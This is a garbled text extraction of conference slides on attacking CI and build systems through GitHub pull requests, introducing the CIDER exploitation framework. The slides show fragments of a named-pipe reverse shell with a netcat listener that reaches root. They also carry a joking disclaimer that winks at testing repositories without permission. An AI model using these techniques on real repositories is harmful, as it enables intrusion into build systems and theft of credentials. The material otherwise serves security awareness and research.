Exploiting Continuous 
Integration (CI) and 
Automated Build Systems
And introducing CIDER
Whoami
• SpaceB0x
• Sr.+Security+Engineer+at+LeanKit
• Application+and+network+security+(offense+and+defense)
• I+like+breaking+in+to+systems,+building+systems,+and+learning
• Security+consultant
./agenda.sh
• Overview+of+Continuous+Integration+concepts
• Configuration+Vulnerabilities+vs.+Application+Vulnerabilities
• Real+world+exploit+#1+
• Common+Bad-practices
• Real+world+exploit+#2+– Attacking+the+CI+provider
• Introduce+CIDER
Continuous1Integration1
Continuous1Integration1(CI)
• Quick+iterative+release+of+code+to+production+servers
• Usually+Many+iterations+per+week+or+even+per+day.+
• Repository+centric
• In+sync+with+Automated+Build
• For+infrastructure/servers/subnets+etc.+
Microservices
• Breaking+down+large+app+into+small+decoupled+components
• These+components+interact+with+each+other
• Eliminates+single+points+of+failure
• Autonomous+development
Security1Implications
• Good+- Frequent+release+cycles+are+fabulous!
• Good+- Faster+code+deployments+=+quick+remediation
• Good+- Decoupled+systems+reduced+single+points+of+failure
• Good+- Compromise+of+one+service+doesn’t+(always)+mean+full+pwnage
Security1Implications
• Good+- Frequent+release+cycles+are+fabulous!
• Good+- Faster+code+deployments+=+quick+remediation
• Good+- Decoupled+systems+reduced+single+points+of+failure
• Good+- Compromise+of+one+service+doesn’t+(always)+mean+full+pwnage
• Bad+- Fast+release+sometimes+means+hasty+oversights
• Bad+– Automated+Deployment+systems+arechecked less+than+the+code+
that+they+deploy+
Tools
Build1Systems
• Take+code+and+build+conditionally
• Typically+in+a+quasi+containerized+type+of+environment
• Both+local+and+cloud+based+are+popular
• Vendor:
ØTravis-CI
ØCircle-CI
ØDrone
ØTeamCity
ØBuildKite
Deployment1Systems
• Deploy+the+code+after+build
• Heading+more+and+more+toward+container+driven
• Vendors
ØJenkins
ØOctopus+Deploy
ØKubernetes
ØRancher
ØMesosphere
Chains1of1Deployment
Chains1of1Deployment
Chains1of
deployment
Checks1in1the1SDLC
• Build+test+before+merges
• Web-hooks+trigger+specific+actions+based+on+conditions
• Services+configured+without+regard+to+one+another
Configuration1Problems
GitHub1– Huge1attack1surface
• Pull+requests+and+commits+trigger+builds
• Build+configurations+normally+in+root+of+repo
• Thus+build+config change+can+be+part+of+PR+or+commit
• Gain+control+of+multiple+systems+through+pull+requests
Vulnerabilities1are1in1Misconfiguration
• Creative+configuration+exploitation
• Vuln stacking+at+it’s+finest
• Each+individual+service+may+be+functioning+exactly+as+intended
• Interaction+between+services+is+where+many+vulnerabilities+lie
External1Repos
• Most+volatile+attack+surface
• Public+repositories+which+map+to+internal+build+services
Real1World1Hax #1
mknod /tmp/backpipe p
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe
nc –l 4444
root
Bad-Practices
Worst-Practices
Environment1Vars
• Being+used+to+store+credentials
• Storing+metadata+for+other+services+within+micro-service+
infrastructure
Run1everything1as1root
• Just+a+container,+right+guyz?
• You+now+have+internal+network+access
• Full+control+to+build+augment+the+image
CI1Provider1Info1leak
• Problems+with+the+CI+Providers+themselves
• Leak+SSH+keys,+etc.+which+can+compromise+other+customers+on+host
• CI+providers+have+at+least+some+permissions+to+GitHub+repos
• Cloud+based+CI+providers+have+a+hosting+environment
• Speaking+of+which…
Real1World1Hax #2
Introducing1CIDER
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
• Mainly+leverages+GitHub+as+attack+surface+to+get+to+build+services
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
• Mainly+leverages+GitHub+as+attack+surface+to+get+to+build+services
• Takes+the+mess+out+forking,+PR-ing,+callbacking
What1is1CIDER?
•Continuous+Integration+and+Deployment+ExploiteR
• Framework+for+exploiting+and+attacking+CI+build+chains
• Mainly+leverages+GitHub+as+attack+surface+to+get+to+build+services
• Takes+the+mess+out+forking,+PR-ing,+callbacking
• It+will+poison+a+handful+of+build+services+and+”exploits”+for+each+one
Why1CIDER?
• Fun
• Make+attacking+easy
• Awareness
• RottenApple by+@claudijd
• Facilitate+further+research
CIDER1overview
CIDER1– ‘help’
CIDER1– ‘add1target’1&1‘list1targets’
CIDER1– ‘load’1and1‘info’
CIDER1features
• Node.JS
• Build+modularly
• Can+handle+bulk+lists+of+target+repos
• Clean+up+for+GitHub+repo+craziness
• Ngrok – because+port+forwarding+and+public+IPs+suck
Ngrok
Disclaimer
• It+is+against+the+GitHub+user+agreement+to+test+against+a+repository,+
even+if+you+have+permission+from+the+owner+of+the+repo
• You+must+be+the+owner+to+test+a+repo
• When+testing+ask+them+to+make+you+an+owner
WINK+WINK
DEMO
Limitations
• Build+Queues
• GitHub+Noise
• Timeouts
• Repo+API+request+throttling
Just1the1beginning…
• More+CI-Frameworks
• Start+tackling+deployment+services
• Start+exploring+other+entrypoints
• Other+code+repositories
• ChatOps (Slack)
Thanks
• LeanKit+Operations+Team
• Evan+Snapp
• @claudijd
Fin
CIDER+on+Github:
https://github.com/spaceB0x/cider
Twitter:+@spaceB0xx
www.untamedtheory.com